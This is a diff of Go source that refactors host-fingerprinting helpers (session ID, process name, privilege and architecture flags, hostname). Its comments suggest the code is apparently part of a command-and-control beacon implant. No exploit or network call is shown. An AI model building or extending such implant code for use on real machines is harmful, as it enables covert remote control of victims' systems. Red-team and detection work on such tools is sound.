@@ -11,27 +11,22 @@ import (
 )
 
 func SessionID() int {
-	randomInt := cryptography.RandomInt(100000, 999998)
-	if randomInt%2 == 0 {
-		return randomInt
-	} else {
-		return randomInt + 1
-	}
+	randomInt := cryptography.RandomInt(100000, 999999)
+	return randomInt & ^1 // clear LSB to mark as non-SSH beacon
 }
 
 func GetProcessName() string {
 	processName := os.Args[0]
-	// C:\Users\admin\Desktop\cmd.exe
-	// ./cmd
 	slashPos := strings.LastIndex(processName, "\\")
-	if slashPos > 0 {
-		return processName[slashPos+1:]
+	if slashPos >= 0 {
+		processName = processName[slashPos+1:]
+	} else if backslashPos := strings.LastIndex(processName, "/"); backslashPos >= 0 {
+		processName = processName[backslashPos+1:]
 	}
-	backslashPos := strings.LastIndex(processName, "/")
-	if backslashPos > 0 {
-		return processName[backslashPos+1:]
+	if processName == "" {
+		return "?"
 	}
-	return "unknown"
+	return processName
 }
 
 func GetPID() int {
@@ -39,24 +34,23 @@ func GetPID() int {
 }
 
 func GetMetaDataFlag() int {
-	flagInt := 0
-	if IsHighPriv() {
-		flagInt += 8
-	} else if IsOSX64() {
-		flagInt += 4
-	} else if IsProcessX64() {
-		flagInt += 2
-	} else {
-		flagInt += 1
+	flag := 0
+	if IsProcessX64() {
+		flag |= 2
 	}
-	return flagInt
+	if IsOSX64() {
+		flag |= 4
+	}
+	if IsHighPriv() {
+		flag |= 8
+	}
+	return flag
 }
 
 func GetComputerName() string {
-	sHostName, _ := os.Hostname()
-	// message too long for RSA public key size
-	if len(sHostName) > 10 {
-		sHostName = sHostName[1 : 10-1]
+	sHostName, err := os.Hostname()
+	if err != nil || sHostName == "" {
+		sHostName = "?"
 	}
 	if runtime.GOOS == "linux" {
 		sHostName = sHostName + " (Linux)"
